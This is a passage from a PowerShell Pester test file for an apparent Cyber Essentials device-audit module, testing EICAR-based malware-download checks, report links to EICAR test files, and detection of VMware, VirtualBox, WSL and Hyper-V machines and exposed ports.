                $cfg.attestation = [pscustomobject]@{ testedOn = $On; testedBy = 'IT'; product = $P; blocked = $B; browsers = 'Edge, Chrome' }
                (Get-CEConfig).'malware-test' = $cfg
            }
        }
        $script:mp11 = { @(Invoke-CEAuditCore -Id 'MP-11') }
    }
    BeforeEach {
        Set-TestDevice -Kind Secure
        InModuleScope CEAudit { (Get-CEConfig).'malware-test' = $script:realMalwareTest }
    }
    AfterAll {
        InModuleScope CEAudit { (Get-CEConfig).'malware-test' = $script:realMalwareTest }
    }

    It 'reads EICAR detections from Defender history, by name or by threat id, and ignores other threats' {
        InModuleScope CEAudit {
            Mock Get-MpThreat { @([pscustomobject]@{ ThreatID = 2147519003; ThreatName = 'Virus:DOS/EICAR_Test_File' }, [pscustomobject]@{ ThreatID = 227072; ThreatName = 'Trojan:Win32/Wacatac' }) }
            $script:detectionsFail = $false
            Mock Get-MpThreatDetection {
                if ($script:detectionsFail) { throw 'Access denied' }
                @([pscustomobject]@{ ThreatID = 2147519003; InitialDetectionTime = (Get-Date).AddDays(-2); ProcessName = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; ActionSuccess = $true; Resources = @('file:_C:\Users\paul\Downloads\eicar.com') },
                  [pscustomobject]@{ ThreatID = 227072; InitialDetectionTime = (Get-Date).AddDays(-1); ProcessName = 'C:\Windows\explorer.exe'; ActionSuccess = $true; Resources = @('file:_C:\x.exe') })
            }
            # Assign without @(): the function returns ,@() and @() would nest it.
            $d = Get-CEMalwareTestDetection
            $d.Count | Should -Be 1
            $d[0].ThreatName | Should -Be 'Virus:DOS/EICAR_Test_File'
            $d[0].Resources | Should -Be 'file:_C:\Users\paul\Downloads\eicar.com'

            Mock Get-MpThreat { @() }
            (Get-CEMalwareTestDetection).Count | Should -Be 1 -Because 'the EICAR threat id is recognised when the threat entry is gone'
            $script:detectionsFail = $true
            (Get-CEMalwareTestDetection).Count | Should -Be 0
        }
    }

    It 'passes when Defender recently blocked the test file, naming the browser' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection {
            @([pscustomobject]@{ Time = (Get-Date).AddDays(-3); Process = 'C:\Program Files\Google\Chrome\Application\chrome.exe'; Resources = @('file:_C:\d\eicar.com'); ActionSuccess = $true; ThreatName = 'Virus:DOS/EICAR_Test_File' },
              [pscustomobject]@{ Time = (Get-Date).AddDays(-1); Process = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; Resources = @('file:_C:\d\eicar_com.zip'); ActionSuccess = $true; ThreatName = 'Virus:DOS/EICAR_Test_File' })
        }
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'stopped the test file 2 time\(s\), most recently .* \(caught when used by msedge\.exe, chrome\.exe\)'
    }

    It 'fails when Defender detected the file but could not remove it' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Process = 'msedge.exe'; Resources = @(); ActionSuccess = $false; ThreatName = 'EICAR' }) }
        (@(& $script:mp11))[0].Status | Should -Be 'Fail'
    }

    It 'ignores tests older than maxTestAgeDays and reports Info, which does not hold back the CE verdict' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @([pscustomobject]@{ Time = (Get-Date).AddDays(-120); Process = 'msedge.exe'; Resources = @(); ActionSuccess = $true; ThreatName = 'EICAR' }) }
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Info'
        $f[0].Recommendation | Should -Match "Malware download test"
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F }
        $summary.Verdict | Should -Match '^READY'
    }

    It 'uses a recorded test for other anti-malware: blocked passes, not blocked fails, old is Info' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @() }
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-10).ToString('yyyy-MM-dd') -Blocked $true
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'by IT: Contoso AV blocked the test downloads'
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-10).ToString('yyyy-MM-dd') -Blocked $false
        (@(& $script:mp11))[0].Status | Should -Be 'Fail'
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-200).ToString('yyyy-MM-dd') -Blocked $true
        (@(& $script:mp11))[0].Actual | Should -Match 'older than 90 days'
        Set-TestMalwareAttestation -TestedOn $null -Blocked $null
        (@(& $script:mp11))[0].Actual | Should -Match 'No blocked test download'
    }

    It 'keeps the TC3 estimate at Check until the download test has passed' {
        InModuleScope CEAudit {
            $base = @{ Title = 't'; Subject = ''; Category = 'MalwareProtection'; Frameworks = @('CE v3.3', 'CE+ TC3'); Reference = ''; Severity = 'Info'; AutoFail = $false; Expected = ''; Actual = ''; Recommendation = ''; Evidence = @(); Remediation = $null }
            $finding = { param($id, $status, $fw) $h = $base.Clone(); $h.FindingId = $id; $h.CheckId = $id; $h.Status = $status; if ($fw) { $h.Frameworks = $fw }; [pscustomobject]$h }
            $mp01 = & $finding 'MP-01' 'Pass'
            $tc3 = { param($findings) ((Get-CESummary -Findings $findings).CEPlus | Where-Object TestCase -eq 'TC3').State }
            & $tc3 @($mp01) | Should -Be 'Check'
            & $tc3 @($mp01, (& $finding 'MP-11' 'Info' @('CE+ TC3'))) | Should -Be 'Check'
            & $tc3 @($mp01, (& $finding 'MP-11' 'Pass' @('CE+ TC3'))) | Should -Be 'Likely pass'
            & $tc3 @((& $finding 'MP-01' 'Fail'), (& $finding 'MP-11' 'Pass' @('CE+ TC3'))) | Should -Be 'Likely fail'
        }
    }

    It 'the HTML and Markdown reports link to the EICAR test files and show the last result' {
        $f = @(Invoke-CEAuditCore -Id 'MP-01', 'MP-11')
        $r = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath (Join-Path $TestDrive 'mt')
        $html = Get-Content $r.Paths.Html -Raw
        $html | Should -Match '<h2 id="malware-test">Malware download test \(CE\+ TC3\)</h2>'
        foreach ($u in 'https://secure.eicar.org/eicar.com"', 'https://secure.eicar.org/eicar.com.txt"', 'https://secure.eicar.org/eicar_com.zip"') {
            $html | Should -Match ([regex]::Escape("<a href=`"$u target=`"_blank`" rel=`"noopener noreferrer`">"))
        }
        # Browsers display text files inline and ignore download= on other sites, so those links say Save link as.
        $html | Should -Match ([regex]::Escape('eicar.com.txt)</a> <span class="ref">right-click and choose <em>Save link as</em></span>'))
        $html | Should -Match ([regex]::Escape('eicar_com.zip)</a> <span class="ref">click to download</span>'))
        $html | Should -Match 'Expect an alert'
        $html | Should -Match 'Last result: <span class=''st st-Info''>&#8505; Info</span> No blocked test download'
        $html | Should -Not -Match 'X5O!P%@AP' -Because 'the report must never contain the test file itself'
        $md = Get-Content $r.Paths.Markdown -Raw
        $md | Should -Match ([regex]::Escape('- [EICAR test file (eicar.com)](https://secure.eicar.org/eicar.com) (right-click and choose Save link as)'))
        $md | Should -Match ([regex]::Escape('- [EICAR test file in a zip (eicar_com.zip)](https://secure.eicar.org/eicar_com.zip)' + "`r`n"))

        $r2 = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'MP-01') -Context $global:CETestCtx -OutputPath (Join-Path $TestDrive 'mt2')
        (Get-Content $r2.Paths.Html -Raw) | Should -Match 'MP-11 was not run'
    }

    It 'nothing in the repository contains the EICAR test string' {
        # Built from pieces so this test file itself doesn't contain it.
        $marker = 'X5O!P%@AP' + '[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE'
        $hits = @(Get-ChildItem -Path $script:RepoRoot -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.FullName -notmatch '[\\/](\.git|node_modules|output|\.wrangler|\.data)[\\/]' } |
            Select-String -SimpleMatch -Pattern $marker -List -ErrorAction SilentlyContinue)
        @($hits | ForEach-Object { $_.Path }) | Should -BeNullOrEmpty
    }
}

Describe 'Virtual machines, WSL and containers (SC-12, FW-07)' {
    BeforeAll {
        function global:New-TestVirtState {
            param([object[]]$HyperV = @(), [object[]]$Nat = @(), [object[]]$VMware = @(), [object[]]$VirtualBox = @(), [object[]]$Wsl = @(),
                [string]$WslNetworking = '', [object[]]$Containers = @(), [object[]]$Listeners = @(), [string[]]$Notes = @(), [bool]$HyperVReadable = $true,
                [object[]]$NotRead = @())
            [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $HyperVReadable; Message = ''; Machines = $HyperV; NatMappings = $Nat }
                VMware = $VMware; VirtualBox = $VirtualBox; Wsl = $Wsl; WslNetworking = $WslNetworking; Containers = $Containers; Listeners = $Listeners
                Notes = @($Notes); NotRead = @($NotRead) }
        }
        function global:New-TestNotRead {
            # A not-read record as the profile read layer (15-ProfileReads.ps1) writes it.
            param([string]$Location = '%USERPROFILE%\VMs\lab\lab.vmx', [string]$Topic = 'vm-file', [string]$Kind = 'file-content',
                [string]$Reason = 'a junction or symbolic link on the way is not followed when reading file contents above the user''s rights', [bool]$NeedsUserSession = $true, [string]$Remedy = '', [int]$Count = 1)
            [ordered]@{ Location = $Location; Kind = $Kind; Reason = $Reason; Remedy = $Remedy; Topic = $Topic; NeedsUserSession = $NeedsUserSession; Count = $Count }
        }
        function global:Set-TestVirt {
            param($State)
            Set-TestDevice -Kind Secure
            $global:CETestVirt = $State
            Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
        }
        $script:run = { param($id) @(Invoke-CEAuditCore -Id $id) }
        $script:sub = { param($f, $s) @($f | Where-Object { $_.Subject -eq $s }) }
    }

    Context 'parsers' {
        It 'reads VMware .vmx networking and shared folders, including the bridged default and VMnet0' {
            InModuleScope CEAudit {
                $vm = ConvertFrom-CEVmxText -Path 'C:\VMs\dev\dev.vmx' -Lines @(
                    '.encoding = "UTF-8"', 'displayName = "Dev box"',
                    'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "nat"',
                    'ethernet1.present = "TRUE"',
                    'ethernet2.present = "TRUE"', 'ethernet2.connectionType = "custom"', 'ethernet2.vnet = "VMnet0"',
                    'ethernet3.present = "FALSE"', 'ethernet3.connectionType = "bridged"',
                    'isolation.tools.hgfs.disable = "FALSE"',
                    'sharedFolder0.present = "TRUE"', 'sharedFolder0.enabled = "TRUE"', 'sharedFolder0.hostPath = "C:\Users\paul\Documents"',
                    'sharedFolder1.present = "TRUE"', 'sharedFolder1.enabled = "FALSE"', 'sharedFolder1.hostPath = "D:\"')
                $vm.Name | Should -Be 'Dev box'
                $vm.Networks | Should -Be @('nat', 'bridged', 'bridged')
                $vm.SharedFolders | Should -Be @('C:\Users\paul\Documents')
                (ConvertFrom-CEVmxText -Path 'C:\VMs\x\x.vmx' -Lines @('isolation.tools.hgfs.disable = "TRUE"', 'sharedFolder0.present = "TRUE"', 'sharedFolder0.enabled = "TRUE"', 'sharedFolder0.hostPath = "C:\"')).SharedFolders.Count | Should -Be 0
                (ConvertFrom-CEVmxText -Path 'C:\VMs\x\x.vmx' -Lines @()).Name | Should -Be 'x'
            }
        }

        It 'reads VirtualBox .vbox bridged adapters, shared folders and NAT port forwards' {
            InModuleScope CEAudit {
                $xml = @'
<?xml version="1.0"?>
<VirtualBox xmlns="http://www.virtualbox.org/" version="1.19-windows">
  <Machine uuid="{1}" name="Kali" OSType="Debian_64">
    <Hardware>
      <Network>
        <Adapter slot="0" enabled="true" type="82540EM">
          <NAT>
            <Forwarding name="ssh" proto="1" hostport="2222" guestport="22"/>
            <Forwarding name="web" proto="1" hostip="127.0.0.1" hostport="8080" guestport="80"/>
            <Forwarding name="dns" proto="0" hostip="0.0.0.0" hostport="5353" guestport="53"/>
          </NAT>
        </Adapter>
        <Adapter slot="1" enabled="true"><BridgedInterface name="Intel(R) Ethernet"/></Adapter>
        <Adapter slot="2" enabled="false"><BridgedInterface name="Wi-Fi"/></Adapter>
      </Network>
      <SharedFolders><SharedFolder name="home" hostPath="C:\Users\paul" writable="true" autoMount="true"/></SharedFolders>
    </Hardware>
  </Machine>
</VirtualBox>
'@
                $vm = ConvertFrom-CEVboxXml -Xml $xml
                $vm.Name | Should -Be 'Kali'
                $vm.Bridged | Should -Be 1
                $vm.SharedFolders | Should -Be @('C:\Users\paul')
                @($vm.PortForwards | Where-Object Exposed | ForEach-Object { "$($_.Protocol)/$($_.HostPort)" }) | Should -Be @('tcp/2222', 'udp/5353')
            }
        }

        It 'cleans wsl.exe UTF-16 output and parses wsl.conf / .wslconfig' {
            InModuleScope CEAudit {
                $names = ConvertFrom-CEWslListOutput -Lines @("D`0e`0b`0i`0a`0n`0", '', "`0", "U`0b`0u`0n`0t`0u`0")
                $names | Should -Be @('Debian', 'Ubuntu')
                $ini = ConvertFrom-CEIniText -Lines @('[boot]', 'systemd=true', '', '# comment', '[automount]', ' enabled = false ', 'root = /mnt/  ; trailing', '[wsl2]', 'networkingMode="mirrored"')
                $ini['automount']['enabled'] | Should -Be 'false'
                $ini['automount']['root'] | Should -Be '/mnt/'
                $ini['wsl2']['networkingmode'] | Should -Be 'mirrored'
            }
        }
    }

    Context 'collection' {
        It 'finds VMware and VirtualBox machines from the user profile' {
            $profileDir = Join-Path $TestDrive 'profile'
            # Below the profile, so the folders checked on the way are the fixture's, not those of this machine's TEMP.
            $vmDir = Join-Path $profileDir 'VMs'
            New-Item -ItemType Directory -Force -Path (Join-Path $profileDir 'AppData\Roaming\VMware'), (Join-Path $profileDir '.VirtualBox'), $vmDir | Out-Null
            $vmx = Join-Path $vmDir 'lab.vmx'
            Set-Content -LiteralPath $vmx -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Roaming\VMware\inventory.vmls') -Value @("vmlist1.config = `"$vmx`"", "vmlist2.config = `"$vmx`"", 'vmlist3.config = "C:\missing\gone.vmx"')
            $vbox = Join-Path $vmDir 'Win.vbox'
            Set-Content -LiteralPath $vbox -Value '<VirtualBox xmlns="http://www.virtualbox.org/"><Machine name="Win"><Hardware><Network><Adapter slot="0" enabled="true"><NAT/></Adapter></Network></Hardware></Machine></VirtualBox>'
            Set-Content -LiteralPath (Join-Path $profileDir '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry><MachineEntry uuid=`"{1}`" src=`"$vbox`"/><MachineEntry uuid=`"{2}`" src=`"C:\missing\x.vbox`"/></MachineRegistry></Global></VirtualBox>"
            Set-Content -LiteralPath (Join-Path $profileDir '.wslconfig') -Value @('[wsl2]', 'networkingMode=bridged')
            InModuleScope CEAudit -Parameters @{ P = $profileDir } {
                param($P)
                $vmware = Get-CEVMwareMachine -ProfilePath $P
                $vmware.Count | Should -Be 1
                $vmware[0].Name | Should -Be 'Lab'
                $vbox = Get-CEVirtualBoxMachine -ProfilePath $P
                $vbox.Count | Should -Be 1
                $vbox[0].Name | Should -Be 'Win'
                Get-CEWslNetworkingMode -ProfilePath $P | Should -Be 'bridged'
                (Get-CEVMwareMachine -ProfilePath (Join-Path $P 'nobody')).Count | Should -Be 0
            }
        }

        It 'WSL: reads drive mounting only for running distributions, and never as SYSTEM' {
            InModuleScope CEAudit {
                Mock Get-CEWslRegistryEntry { @([pscustomobject]@{ Name = 'Debian'; Version = 2 }, [pscustomobject]@{ Name = 'Ubuntu'; Version = 2 }, [pscustomobject]@{ Name = 'Alpine'; Version = 2 }, [pscustomobject]@{ Name = 'docker-desktop'; Version = 2 }) }
                Mock Invoke-CENative { [pscustomobject]@{ ExitCode = 0; Output = @("D`0e`0b`0i`0a`0n`0", "A`0l`0p`0i`0n`0e`0", "d`0o`0c`0k`0e`0r`0-`0d`0e`0s`0k`0t`0o`0p`0") } }
                Mock Read-CEWslConf {
                    switch ($Name) {
                        'Debian' { [pscustomobject]@{ Reachable = $true; Exists = $true; Lines = @('[automount]', 'enabled=false') } }
                        'Alpine' { [pscustomobject]@{ Reachable = $true; Exists = $false; Lines = @() } }
                        default { [pscustomobject]@{ Reachable = $false; Exists = $false; Lines = @() } }
                    }
                }
                $d = Get-CEWslDistribution -Context ([pscustomobject]@{ IsSystem = $false })
                ($d | Where-Object Name -eq 'Debian').Automount | Should -BeFalse
                ($d | Where-Object Name -eq 'Alpine').Automount | Should -BeTrue
                ($d | Where-Object Name -eq 'Alpine').AutomountSource | Should -Match 'default applies'
                ($d | Where-Object Name -eq 'Ubuntu').Running | Should -BeFalse
                ($d | Where-Object Name -eq 'Ubuntu').Automount | Should -BeNullOrEmpty
                Should -Invoke Read-CEWslConf -Times 0 -ParameterFilter { $Name -eq 'Ubuntu' }
                ($d | Where-Object Name -eq 'docker-desktop').AutomountSource | Should -Match 'could not be read'

                $asSystem = Get-CEWslDistribution -Context ([pscustomobject]@{ IsSystem = $true })
                @($asSystem | Where-Object { $null -ne $_.Automount }).Count | Should -Be 0
                ($asSystem | Where-Object Name -eq 'Debian').AutomountSource | Should -Match 'SYSTEM'
                Should -Invoke Invoke-CENative -Times 1 -Exactly
            }
        }

        It 'Hyper-V: needs elevation, and reports VMs on external switches and NAT mappings' {
            InModuleScope CEAudit {
                Mock Get-Service { [pscustomobject]@{ Name = 'vmms'; Status = 'Running' } }
                Mock Get-Command { [pscustomobject]@{ Name = $Name } } -ParameterFilter { $Name -in 'Get-VM', 'Get-NetNatStaticMapping' }
                (Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $false })).Readable | Should -BeFalse
                Mock Get-VMSwitch { @([pscustomobject]@{ Name = 'External LAN'; SwitchType = 'External' }, [pscustomobject]@{ Name = 'Default Switch'; SwitchType = 'Internal' }) }
                Mock Get-VM { @([pscustomobject]@{ Name = 'Server'; State = 'Running' }, [pscustomobject]@{ Name = 'Test'; State = 'Off' }) }
                # -RemoveParameterType: where the Hyper-V module is installed, -VM takes only its VirtualMachine objects.
                Mock Get-VMNetworkAdapter { if ($VM.Name -eq 'Server') { [pscustomobject]@{ SwitchName = 'External LAN' } } else { [pscustomobject]@{ SwitchName = 'Default Switch' } } } -RemoveParameterType 'VM'
                Mock Get-NetNatStaticMapping { [pscustomobject]@{ Protocol = 'TCP'; ExternalIPAddress = '0.0.0.0'; ExternalPort = 3389; InternalIPAddress = '172.20.0.5'; InternalPort = 3389 } }
                $h = Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $true })
                $h.Readable | Should -BeTrue
                ($h.Machines | Where-Object Name -eq 'Server').ExternalSwitches | Should -Be @('External LAN')
                @(($h.Machines | Where-Object Name -eq 'Test').ExternalSwitches).Count | Should -Be 0
                $h.NatMappings | Should -Be @('TCP 0.0.0.0:3389 -> 172.20.0.5:3389')
                @($h.NotRead).Count | Should -Be 0
                # Each VM's adapters are asked for by the VM itself, not by a name that is a wildcard pattern.
                Should -Invoke Get-VMNetworkAdapter -Times 2 -Exactly -ParameterFilter { $null -ne $VM -and $null -eq $VMName }
            }
        }

        It 'Hyper-V: is listed only where the platform is, whether or not its PowerShell module is' {
            # Every branch: the platform is the vmms service; the module is Get-VM. Nothing else is a Pass without looking.
            $r = InModuleScope CEAudit {
                $elevated = [pscustomobject]@{ IsElevated = $true }
                $script:hvCmds = @()
                Mock Get-Command { if ($script:hvCmds -contains $Name) { [pscustomobject]@{ Name = $Name } } }
                Mock Get-VMSwitch { @() }
                Mock Get-VM { @([pscustomobject]@{ Name = 'Server'; State = 'Running' }) }
                Mock Get-VMNetworkAdapter { [pscustomobject]@{ SwitchName = 'Default Switch' } } -RemoveParameterType 'VM'
                $out = [ordered]@{}
                # No module, no platform: nothing to list.
                Mock Get-Service { throw [System.Management.Automation.ErrorRecord]::new([Exception]::new('no such service'), 'NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.GetServiceCommand', 'ObjectNotFound', 'vmms') }
                $out.NoneNone = Get-CEHyperVMachine -Context $elevated
                # Module, no platform (an admin workstation with the management tools): nothing to list, even if listing would throw.
                $script:hvCmds = @('Get-VM')
                Mock Get-VMSwitch { throw 'The Hyper-V Virtual Machine Management service is not running' }
                $out.ModuleOnly = Get-CEHyperVMachine -Context $elevated
                $out.ModuleOnlyUser = Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $false })
                # Platform, no module (Server installed without its management tools): not read, never none.
                Mock Get-Service { [pscustomobject]@{ Name = 'vmms'; Status = 'Running' } }
                $script:hvCmds = @()
                $out.PlatformOnly = Get-CEHyperVMachine -Context $elevated
                # Platform and module, listing throws: not read.
                $script:hvCmds = @('Get-VM')
                $out.Throws = Get-CEHyperVMachine -Context $elevated
                # Platform and module, listing works: the machines.
                Mock Get-VMSwitch { @() }
                $out.Lists = Get-CEHyperVMachine -Context $elevated
                # A service manager that can't be asked counts as the platform being there.
                Mock Get-Service { throw 'Access is denied' }
                $script:hvCmds = @()
                $out.Unknown = Get-CEHyperVMachine -Context $elevated
                $out.Records = @(foreach ($k in 'NoneNone', 'ModuleOnly', 'ModuleOnlyUser', 'PlatformOnly', 'Throws', 'Lists') {
                        $log = New-CENotReadLog
                        Add-CEHyperVNotRead -Log $log -HyperV $out[$k]
                        $recs = Get-CENotReadRecordArray $log   # assign first: it returns ,array
                        "${k}:" + (@($recs | ForEach-Object { "$($_.Topic)|$($_.Reason)" }) -join ',')
                    })
                $out
            }
            foreach ($k in 'NoneNone', 'ModuleOnly', 'ModuleOnlyUser') {
                $r[$k].Readable | Should -BeTrue -Because $k
                @($r[$k].Machines).Count | Should -Be 0 -Because $k
            }
            $r.PlatformOnly.Readable | Should -BeFalse
            $r.PlatformOnly.Reason | Should -Match 'without its PowerShell module'
            $r.PlatformOnly.Remedy | Should -Match 'Install the Hyper-V PowerShell module'
            $r.PlatformOnly.Remedy | Should -Match 'list the VMs by hand'
            $r.PlatformOnly.Message | Should -Match 'could not be listed'
            $r.Throws.Readable | Should -BeFalse
            $r.Throws.Reason | Should -Be 'it could not be read (RuntimeException)'
            $r.Lists.Readable | Should -BeTrue
            @($r.Lists.Machines | ForEach-Object Name) | Should -Be @('Server')
            $r.Unknown.Readable | Should -BeFalse -Because 'a platform that could not be ruled out is not passed over'
            $r.Records | Should -Be @(
                'NoneNone:', 'ModuleOnly:', 'ModuleOnlyUser:',
                'PlatformOnly:hyperv|Hyper-V is installed without its PowerShell module, so the audit cannot list them',
                'Throws:hyperv|it could not be read (RuntimeException)',
                'Lists:')
        }

        It 'Hyper-V: records a VM whose adapters, and NAT mappings that, could not be read' {
            $h = InModuleScope CEAudit {
                Mock Get-Service { [pscustomobject]@{ Name = 'vmms'; Status = 'Running' } }
                Mock Get-Command { [pscustomobject]@{ Name = $Name } } -ParameterFilter { $Name -in 'Get-VM', 'Get-NetNatStaticMapping' }
                Mock Get-VMSwitch { @([pscustomobject]@{ Name = 'External LAN'; SwitchType = 'External' }) }
                Mock Get-VM { @([pscustomobject]@{ Name = 'Web[1]'; State = 'Running' }, [pscustomobject]@{ Name = 'Lab'; State = 'Off' }) }
                Mock Get-VMNetworkAdapter { if ($VM.Name -eq 'Web[1]') { throw 'Access denied on C:\ProgramData\Microsoft\Windows\Hyper-V' } else { [pscustomobject]@{ SwitchName = 'Default Switch' } } } -RemoveParameterType 'VM'
                Mock Get-NetNatStaticMapping { throw 'WinNAT failed' }
                $hv = Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $true })
                $log = New-CENotReadLog
                Add-CEHyperVNotRead -Log $log -HyperV $hv
                $recs = Get-CENotReadRecordArray $log   # assign first: it returns ,array
                [pscustomobject]@{ HyperV = $hv; Records = $recs }
            }
            $h.HyperV.Readable | Should -BeTrue
            @($h.HyperV.Machines | ForEach-Object Name) | Should -Be @('Web[1]', 'Lab')
            @($h.Records | ForEach-Object { "$($_.Topic)|$($_.Location)|$($_.Reason)" }) | Should -Be @(
                "hyperv|Hyper-V virtual machine 'Web[1]'|its network adapters could not be read (RuntimeException)",
                'hyperv|NAT port mappings|they could not be read (RuntimeException)')
            ($h | ConvertTo-Json -Depth 6) | Should -Not -Match 'ProgramData|WinNAT'
            # FW-07 is then Manual, not a Pass, with nothing found exposed.
            $st = New-TestVirtState -HyperV @($h.HyperV.Machines) -NotRead @($h.Records)
            Set-TestVirt $st
            @(& $script:run 'FW-07' | ForEach-Object Status) | Should -Be @('Manual')
        }

        It 'listening ports: only known publishing processes, flagged when not on loopback' {
            InModuleScope CEAudit {
                Mock Get-Command { [pscustomobject]@{ Name = 'Get-NetTCPConnection' } } -ParameterFilter { $Name -eq 'Get-NetTCPConnection' }
                Mock Get-NetTCPConnection {
                    @([pscustomobject]@{ LocalAddress = '0.0.0.0'; LocalPort = 8080; OwningProcess = 10 },
                      [pscustomobject]@{ LocalAddress = '127.0.0.1'; LocalPort = 5432; OwningProcess = 10 },
                      [pscustomobject]@{ LocalAddress = '::'; LocalPort = 445; OwningProcess = 4 },
                      [pscustomobject]@{ LocalAddress = '::1'; LocalPort = 2222; OwningProcess = 20 })
                }
                Mock Get-Process { switch ($Id) { 10 { [pscustomobject]@{ ProcessName = 'com.docker.backend' } } 20 { [pscustomobject]@{ ProcessName = 'wslrelay' } } default { [pscustomobject]@{ ProcessName = 'System' } } } }
                $l = Get-CEVirtualisationListener
                $l.Count | Should -Be 3
                @($l | Where-Object Exposed | ForEach-Object { "$($_.Product) $($_.Address):$($_.Port)" }) | Should -Be @('Docker Desktop 0.0.0.0:8080')
            }
        }
    }

    Context 'SC-12' {
        It 'passes when nothing is found, and is Info when parts could not be checked' {
            Set-TestVirt (New-TestVirtState)
            $f = @(& $script:run 'SC-12')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Pass'
            Set-TestVirt (New-TestVirtState -Notes @('Hyper-V virtual machines need elevation to list'))
            $f = @(& $script:run 'SC-12')
            $f[0].Status | Should -Be 'Info'
            $f[0].Actual | Should -Match 'need elevation'
        }

        It 'sends VM files an elevated audit skipped to the user''s own session, not to another elevated run' {
            $rec = New-TestNotRead
            $line = '%USERPROFILE%\VMs\lab\lab.vmx (file not read): a junction or symbolic link on the way is not followed when reading file contents above the user''s rights'
            Set-TestVirt (New-TestVirtState -NotRead @($rec))
            $f = @(& $script:run 'SC-12')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Manual' -Because 'a virtual machine that was not read is not a Pass, and Info would count as one'
            $f[0].Subject | Should -Be 'Not read'
            $f[0].Actual | Should -Be "1 location(s) could not be read, so a virtual machine may be missing from this list: $line"
            @($f[0].Evidence) | Should -Be @($line)
            $f[0].Recommendation | Should -Match 'Invoke-CEUserProbe'
            $f[0].Recommendation | Should -Not -Match 'elevated prompt' -Because 'an elevated run skips the same files'
            # Notes that are not about reading the profile keep their Info, with their own advice.
            Set-TestVirt (New-TestVirtState -Notes @('Hyper-V virtual machines need elevation to list') -NotRead @($rec))
            $f = @(& $script:run 'SC-12')
            @($f | ForEach-Object Status) | Should -Be @('Info', 'Manual')
            $f[0].Recommendation | Should -Match 'elevated prompt'
            $f[1].Recommendation | Should -Match 'Invoke-CEUserProbe'
            # A record SC-12 does not depend on changes nothing.
            Set-TestVirt (New-TestVirtState -NotRead @(New-TestNotRead -Location '%USERPROFILE%\.wslconfig' -Topic 'wslconfig'))
            (@(& $script:run 'SC-12'))[0].Status | Should -Be 'Pass'
        }

        It 'lists everything found as in scope, and warns about shared folders and WSL drive mounting' {
            Set-TestVirt (New-TestVirtState `
                -HyperV @([pscustomobject]@{ Name = 'Server'; State = 'Running'; ExternalSwitches = @() }) `
                -VMware @([pscustomobject]@{ Name = 'Lab'; Networks = @('nat'); SharedFolders = @('C:\Users\paul') }) `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 0; SharedFolders = @(); PortForwards = @() }) `
                -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $true; AutomountSource = 'read from /etc/wsl.conf'; Tooling = $false },
                       [pscustomobject]@{ Name = 'Ubuntu'; Version = 2; Running = $false; Automount = $null; AutomountSource = 'not verified: the distribution is not running'; Tooling = $false },
                       [pscustomobject]@{ Name = 'Alpine'; Version = 1; Running = $true; Automount = $false; AutomountSource = 'read from /etc/wsl.conf'; Tooling = $false },
                       [pscustomobject]@{ Name = 'docker-desktop'; Version = 2; Running = $true; Automount = $true; AutomountSource = ''; Tooling = $true }) `
                -Containers @([pscustomobject]@{ Name = 'db'; Image = 'postgres:16'; Ports = '5432/tcp' }))
            $f = @(& $script:run 'SC-12')
            $main = & $script:sub $f ''
            $main.Status | Should -Be 'Manual'
            $main.Actual | Should -Match "^8 found: Hyper-V virtual machine 'Server' \(Running\); VMware virtual machine 'Lab'; VirtualBox virtual machine 'Kali'; WSL 2 distribution 'Debian' \(running\); WSL 2 distribution 'Ubuntu' \(stopped\); WSL 1 distribution 'Alpine' \(running\); Container platform \(docker-desktop\); Container 'db' \(postgres:16\)$" -Because 'count, then each item'
            (& $script:sub $f 'Shared folders').Actual | Should -Be "Host folders shared with virtual machines: VMware 'Lab': C:\Users\paul"
            $mount = & $script:sub $f 'WSL drive mounting'
            $mount.Status | Should -Be 'Warn'
            $mount.Actual | Should -Be 'Windows drives (C: at /mnt/c) are mounted in: Debian (read from /etc/wsl.conf); Ubuntu (on by default, not verified: the distribution is not running)'
            $mount.Recommendation | Should -Match 'enabled = false'
        }
    }

    Context 'FW-07' {
        It 'is not applicable with no virtualisation, and passes when nothing is exposed' {
            Set-TestVirt (New-TestVirtState)
            (& $script:run 'FW-07')[0].Status | Should -Be 'NotApplicable'
            Set-TestVirt (New-TestVirtState -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $false; AutomountSource = ''; Tooling = $false }) `
